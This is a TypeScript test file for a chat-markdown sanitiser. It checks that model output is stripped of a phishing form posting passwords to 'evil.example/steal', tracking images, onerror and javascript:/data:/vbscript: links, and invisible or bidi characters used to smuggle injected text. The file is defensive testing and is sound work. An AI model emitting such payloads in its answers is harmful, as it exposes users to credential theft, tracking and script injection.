import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';
import { renderChatMarkdown, sanitizeChatHtml } from '$lib/chat-markdown';
import { isInvisible } from '$lib/invisible';

function parse(html: string): HTMLElement {
	const el = document.createElement('div');
	el.innerHTML = html;
	return el;
}

// F3 (#4710): model output is untrusted. The payload a steered answer could carry.
const PAYLOAD = [
	'Intro paragraph.',
	'',
	'<form action="https://evil.example/steal" method="post"><input name="pw" type="password"><button>Sign in</button></form>',
	'',
	'<style>body{display:none}</style>',
	'',
	'![track](https://tracker.example/pixel.png)',
	'',
	'<img src="https://tracker.example/raw.png" onerror="alert(1)">',
	'',
	'[click](javascript:alert(1))',
	'',
	'[good](https://example.com/page)'
].join('\n');

describe('renderChatMarkdown: F3 payload', () => {
	const out = parse(renderChatMarkdown(PAYLOAD));

	it('removes forms and every form control', () => {
		for (const sel of ['form', 'input', 'button', 'select', 'textarea', 'label']) {
			expect(out.querySelector(sel), sel).toBeNull();
		}
	});

	it('removes style elements and their content', () => {
		expect(out.querySelector('style')).toBeNull();
		expect(out.innerHTML).not.toContain('display:none');
	});

	it('removes images, markdown and raw, with no remote src left anywhere', () => {
		expect(out.querySelector('img')).toBeNull();
		expect(out.innerHTML).not.toContain('tracker.example');
		expect(out.innerHTML).not.toContain('onerror');
	});

	it('drops the href of a javascript: link but keeps its text', () => {
		const link = [...out.querySelectorAll('a')].find((a) => a.textContent === 'click');
		expect(link).toBeDefined();
		expect(link!.hasAttribute('href')).toBe(false);
		expect(out.innerHTML).not.toContain('javascript:');
	});

	it('keeps a normal link with href intact and rel="noopener noreferrer"', () => {
		const link = [...out.querySelectorAll('a')].find((a) => a.textContent === 'good');
		expect(link).toBeDefined();
		expect(link!.getAttribute('href')).toBe('https://example.com/page');
		expect(link!.getAttribute('rel')).toBe('noopener noreferrer');
	});

	it('keeps ordinary prose', () => {
		expect(out.querySelector('p')?.textContent).toBe('Intro paragraph.');
	});
});

describe('renderChatMarkdown: markdown subset', () => {
	it('renders the supported elements', () => {
		const md = [
			'# H1',
			'###### H6',
			'',
			'**bold** *em* `code`',
			'',
			'- a',
			'- b',
			'',
			'1. one',
			'',
			'> quote',
			'',
			'```',
			'pre block',
			'```',
			'',
			'---',
			'',
			'line one  ',
			'line two'
		].join('\n');
		const out = parse(renderChatMarkdown(md));
		for (const sel of ['h1', 'h6', 'strong', 'em', 'code', 'ul li', 'ol li', 'blockquote', 'pre', 'hr', 'br']) {
			expect(out.querySelector(sel), sel).not.toBeNull();
		}
	});

	it.each([
		['http', 'http://example.com/a', 'http://example.com/a'],
		['https', 'https://example.com/a', 'https://example.com/a'],
		['mailto', 'mailto:a@example.com', 'mailto:a@example.com']
	])('keeps %s hrefs', (_n, href, expected) => {
		const out = parse(renderChatMarkdown(`[x](${href})`));
		expect(out.querySelector('a')!.getAttribute('href')).toBe(expected);
	});

	it.each([
		'javascript:alert(1)',
		'JaVaScRiPt:alert(1)',
		'data:text/html,<b>x</b>',
		'vbscript:x',
		'/relative/path',
		'//evil.example/x',
		'#frag'
	])('drops href %s', (href) => {
		const out = parse(sanitizeChatHtml(`<a href="${href}">x</a>`));
		expect(out.querySelector('a')!.hasAttribute('href')).toBe(false);
		expect(out.querySelector('a')!.getAttribute('rel')).toBe('noopener noreferrer');
	});

	it('drops a javascript: href disguised with embedded whitespace/control characters', () => {
		const out = parse(sanitizeChatHtml('<a href="jav&#x09;ascript:alert(1)">x</a>'));
		expect(out.querySelector('a')!.hasAttribute('href')).toBe(false);
	});

	it('strips attributes other than href (class, style, target, title, on*)', () => {
		const out = parse(
			sanitizeChatHtml(
				'<a href="https://example.com" class="c" style="color:red" target="_blank" title="t" onclick="x()">x</a>'
			)
		);
		const a = out.querySelector('a')!;
		expect([...a.attributes].map((at) => at.name).sort()).toEqual(['href', 'rel']);
	});

	it('does not leak the link hook into other DOMPurify users', () => {
		sanitizeChatHtml('<a href="https://example.com">x</a>');
		const other = parse(DOMPurify.sanitize('<a href="/relative">x</a>'));
		expect(other.querySelector('a')!.getAttribute('href')).toBe('/relative');
		expect(other.querySelector('a')!.hasAttribute('rel')).toBe(false);
	});
});

// Characters are built from code points, never written as literals.
const cp = (...n: number[]) => String.fromCodePoint(...n);
const ZWSP = cp(0x200b);
const TAG_A = cp(0xe0041);

describe('renderChatMarkdown: invisible characters (#4711 LLM01)', () => {
	it('strips raw invisible characters before and after markdown parsing', () => {
		const out = parse(
			renderChatMarkdown(`**bo${ZWSP}ld** and [te${TAG_A}xt](https://exa${ZWSP}mple.com)`)
		);
		expect(out.querySelector('strong')!.textContent).toBe('bold');
		const a = out.querySelector('a')!;
		expect(a.textContent).toBe('text');
		expect(a.getAttribute('href')).toBe('https://example.com');
	});

	// Character references are decoded AFTER the first strip, so they must be
	// caught on the output. Asserted on the parsed DOM, not the HTML string.
	it.each([
		['hex reference', 'a&#x200B;b', 'ab'],
		['decimal reference', 'a&#8203;b', 'ab'],
		['named reference', 'a&ZeroWidthSpace;b', 'ab'],
		['tag-block hex reference', 'a&#xE0041;b', 'ab'],
		['tag-block decimal reference (U+E0041)', 'a&#917569;b', 'ab'],
		['soft hyphen named reference', 'a&shy;b', 'ab'],
		['bidi override reference', 'a&#x202E;b', 'ab'],
		['selector after a stripped reference', 'a&#x200B;&#xFE0F;b', 'ab']
	])('strips a %s from the rendered text', (_name, md, expected) => {
		const out = parse(renderChatMarkdown(md));
		expect(out.textContent!.trim()).toBe(expected);
	});

	it('strips a character reference inside a link href and its text', () => {
		const out = parse(renderChatMarkdown('[t&#x200B;ext](https://exa&#x200B;mple.com)'));
		const a = out.querySelector('a')!;
		expect(a.textContent).toBe('text');
		expect(a.getAttribute('href')).toBe('https://example.com');
	});

	// A "keep a selector after a visible character" rule leaked across markup
	// boundaries: the tags made each selector follow a visible tag character.
	it.each([
		['bold', (s: string) => `**${s}**`],
		['emphasis', (s: string) => `*${s}*`],
		['code', (s: string) => `\`${s}\``]
	])('leaves no selector in the rendered textContent across %s boundaries', (_n, wrap) => {
		// Raw selectors, and a reference form that only decodes after the first
		// strip and so really does land inside the emitted tags.
		for (const sel of [cp(0xfe0f), '&#xFE0F;']) {
			const out = parse(renderChatMarkdown(`a ${wrap(sel).repeat(8)} b`));
			const text = out.textContent!;
			expect(text, sel).not.toContain(cp(0xfe0f));
			expect(text, sel).not.toContain(cp(0xfe0e));
			expect([...text].some((ch) => isInvisible(ch.codePointAt(0)!)), sel).toBe(false);
		}
	});
});

describe('renderChatMarkdown: markdown that marked emits (allowlist regression)', () => {
	it('keeps <ol start>', () => {
		const out = parse(renderChatMarkdown('3. three\n4. four'));
		expect(out.querySelector('ol')!.getAttribute('start')).toBe('3');
	});

	it('keeps tables', () => {
		const out = parse(renderChatMarkdown('| h1 | h2 |\n|----|----|\n| a | b |'));
		for (const sel of ['table', 'thead tr th', 'tbody tr td']) {
			expect(out.querySelector(sel), sel).not.toBeNull();
		}
		expect(out.querySelector('th')!.textContent).toBe('h1');
		expect(out.querySelector('td')!.textContent).toBe('a');
	});

	it('keeps align on th and td (column alignment)', () => {
		const out = parse(renderChatMarkdown('| l | c | r |\n|:--|:-:|--:|\n| 1 | 2 | 3 |'));
		const aligns = [...out.querySelectorAll('th, td')].map((e) => e.getAttribute('align'));
		expect(aligns).toEqual(['left', 'center', 'right', 'left', 'center', 'right']);
	});

	it('drops align off th/td and any value outside left/center/right', () => {
		const out = parse(
			sanitizeChatHtml(
				'<p align="left">p</p><table><tr><td align="javascript:x">c</td><th align="right">h</th></tr></table>'
			)
		);
		expect(out.querySelector('p')!.hasAttribute('align')).toBe(false);
		expect(out.querySelector('td')!.hasAttribute('align')).toBe(false);
		expect(out.querySelector('th')!.getAttribute('align')).toBe('right');
	});

	it('keeps del', () => {
		const out = parse(renderChatMarkdown('~~gone~~'));
		expect(out.querySelector('del')!.textContent).toBe('gone');
	});

	it('still drops style, class and on* from allowed table elements', () => {
		const out = parse(
			sanitizeChatHtml('<table style="x" class="y"><tr><td onclick="z()">c</td></tr></table>')
		);
		expect([...out.querySelector('table')!.attributes]).toHaveLength(0);
		expect([...out.querySelector('td')!.attributes]).toHaveLength(0);
	});
});
